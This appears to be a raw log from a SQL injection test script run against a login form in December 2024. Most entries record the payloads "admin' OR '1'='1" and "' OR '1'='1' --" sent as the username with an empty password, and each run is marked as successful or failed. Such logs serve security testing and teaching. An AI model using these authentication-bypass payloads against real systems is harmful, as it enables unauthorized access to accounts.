2024-12-04 02:48:55,733 - WARNING - Potential attack detected: SQL Injection attempt for username: admin1
2024-12-04 02:56:10,729 - INFO - Starting SQL Injection attack...
2024-12-04 02:56:10,729 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-04 02:56:10,734 - INFO - SQL Injection attack successful!
2024-12-04 03:08:31,873 - INFO - Starting SQL Injection attack...
2024-12-04 03:08:31,873 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-04 03:08:31,877 - WARNING - SQL Injection attack failed.
2024-12-04 03:10:13,764 - INFO - Starting SQL Injection attack...
2024-12-04 03:10:13,764 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-04 03:10:15,652 - INFO - SQL Injection attack successful!
2024-12-04 05:00:37,162 - INFO - Starting SQL Injection attack...
2024-12-04 05:00:37,162 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-04 05:00:37,167 - WARNING - SQL Injection attack failed.
2024-12-13 17:15:51,479 - INFO - Starting SQL Injection attack...
2024-12-13 17:15:51,481 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-13 17:15:51,486 - WARNING - SQL Injection attack failed.
2024-12-13 17:34:36,061 - INFO - Starting SQL Injection attack...
2024-12-13 17:34:36,061 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-13 17:34:36,066 - WARNING - SQL Injection attack failed.
2024-12-13 17:34:57,756 - INFO - Starting SQL Injection attack...
2024-12-13 17:34:57,757 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-13 17:34:57,772 - WARNING - SQL Injection attack failed.
2024-12-13 17:39:15,722 - INFO - Starting SQL Injection attack...
2024-12-13 17:39:15,723 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-13 17:39:15,738 - WARNING - SQL Injection attack failed.
2024-12-13 17:39:38,974 - INFO - Starting SQL Injection attack...
2024-12-13 17:39:38,975 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-13 17:39:38,990 - WARNING - SQL Injection attack failed.
2024-12-13 17:40:59,385 - INFO - Starting SQL Injection attack...
2024-12-13 17:40:59,385 - INFO - Payload sent: {'username': "admin' OR '1'='1", 'password': ''}
2024-12-13 17:40:59,389 - WARNING - SQL Injection attack failed.
2024-12-13 17:53:38,360 - INFO - Starting SQL Injection attack...
2024-12-13 17:53:38,360 - INFO - Payload sent: {'username': "' OR '1'='1' --", 'password': ''}
2024-12-13 17:53:38,365 - INFO - SQL Injection attack successful!
2024-12-13 17:54:30,399 - INFO - Starting SQL Injection attack...
2024-12-13 17:54:30,400 - INFO - Payload sent: {'username': "' OR '1'='1' --", 'password': ''}
2024-12-13 17:54:30,405 - INFO - SQL Injection attack successful!
2024-12-13 17:54:55,651 - INFO - Starting SQL Injection attack...
2024-12-13 17:54:55,651 - INFO - Payload sent: {'username': "' OR '1'='1' --", 'password': ''}
2024-12-13 17:54:55,657 - WARNING - SQL Injection attack failed.
